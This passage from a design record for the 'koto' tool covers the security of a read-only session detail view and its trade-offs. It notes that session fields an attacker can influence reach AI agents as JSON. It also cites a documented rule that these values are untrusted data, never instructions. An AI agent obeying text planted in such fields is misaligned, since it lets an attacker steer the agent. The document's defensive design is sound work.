attacker-influenceable text (excerpts, key names, `intent`, `writer`, the
banner strings) as JSON that agents will read, and the skill documentation
points them at it. Terminal safety does not address text that tells a model
what to do. The reference page and the koto-user skill state that every
`content`, `key`, `writer` and `intent` value is untrusted data to be read,
never instructions to follow, and that `stale` is advisory. The residual risk
is accepted and named: a session's own content was always going to be read by
whoever reads the session.

**What the view does not change.** It adds no credential use: cloud access goes through the existing backend with its existing credential handling, and `--detail` errors reuse the `handle_status` convention, whose messages go through `without_url_userinfo` where the backend already applies it. The view does not execute anything from the session: the directive text is interpolated by the extracted `handle_status` logic, which only substitutes variables into the template's text and does not run gates or commands. The compiled template still comes from the host's cache, never the bucket, so a hostile bucket cannot make the view show directive text the host's template does not contain. Finally, output is local: nothing is sent anywhere, and the workflow file is written with the same permissions and atomic-write behavior as the existing projection.

## Consequences

### Positive

- A person reads a session's full working state in the surfaces koto ships,
  with one derivation shared by `status`, the dashboard and the one-shot
  mode — the third copy of state derivation is avoided, and `handle_status`
  sheds its process-exit coupling.
- The view is provably read-only: no syncing `get`, no events, no marker
  writes; the carrier fixtures give it a ready-made real session to test
  against.
- Frozen contracts stay frozen: feed columns untouched, workflow fields
  additive behind a version bump, verb set unchanged.

### Negative

- The TUI gains a second loading path beside `read_detail`; two detail
  loaders coexist until a later consolidation, and both share the inherited
  synchronous-read stall on a hung filesystem.
- A long-open TUI caches the migration check per process, so a migration
  that happens mid-session shows on the next dashboard start, not live.
- Local-content-only rendering means a key pulled nowhere shows no excerpt;
  the `stale`/`not-local` markers tell the reader why, but reading that
  content still requires the existing pull-bearing paths.

### Mitigations

- The Session tab's loader is keyed and invalidated by the same mtime signal
  `read_detail` uses, so the two paths cannot disagree about freshness.
- The stale flag is computed from data already fetched, so the honesty about
  staleness costs nothing.
- The one-shot `--detail` mode documents `locality` and `stale` so scripts
  can decide to pull deliberately with existing verbs.
